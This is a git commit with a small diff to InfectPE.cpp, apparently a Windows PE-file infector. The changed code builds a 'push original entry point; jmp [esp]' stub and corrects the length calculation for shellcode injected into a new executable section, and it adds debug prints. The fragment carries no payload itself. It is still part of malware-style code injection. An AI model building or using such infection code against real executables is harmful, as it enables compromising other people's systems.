cd564809ca0aaac3638018c1d41440c2390d1d7d
Algafix <Algafix@gmail.com>
2020-12-13 11:56:50 -0800

    Fixed injection code length.

--- InfectPE/InfectPE.cpp
+++ InfectPE/InfectPE.cpp
@@ -38,7 +38,12 @@ void Inject_New_Section(char* pe_file, size_t size_of_pe, char xcode[], size_t s
 	char push[] = "\x68"; // push
 	char esp[] = "\xff\x24\x24"; // jmp [esp]
 	char hex_oep[] = { image_base_OEP >> 0 & 0xFF, image_base_OEP >> 8 & 0xFF, image_base_OEP >> 16 & 0xFF, image_base_OEP >> 24 & 0xFF }; // OEP
-	auto inj_size = sizeof push + sizeof esp + sizeof hex_oep + size_of_xcode - 4; // revisar el -4
+	auto inj_size = sizeof push + sizeof esp + sizeof hex_oep + size_of_xcode - 3; // -3 for the end teminator \0, hex_oep doen't have it because its defined char by char.
+
+	cout << "size of push: " << sizeof push << endl;
+	cout << "size of esp: " << sizeof esp << endl;
+	cout << "size of hex_oep: " << sizeof hex_oep << endl;
+	cout << "size of xcode: " << size_of_xcode << endl;
 
 	// ------------- Construction of Image Section Headers -----------------
 
